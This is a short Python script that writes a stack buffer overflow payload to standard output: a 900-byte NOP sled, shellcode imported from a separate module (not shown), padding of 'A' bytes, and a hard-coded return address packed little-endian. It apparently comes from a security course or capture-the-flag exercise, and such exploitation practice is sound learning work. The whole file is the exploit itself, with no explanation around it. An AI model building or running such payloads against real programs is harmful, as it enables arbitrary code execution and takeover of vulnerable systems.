#!/usr/bin/env python3

import sys

from shellcode import shellcode

sys.stdout.buffer.write(b'\x90' * 900)
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b'A'*70)
sys.stdout.buffer.write(b'A'*8)
sys.stdout.buffer.write(0x7ffffff68290.to_bytes(8,'little'))
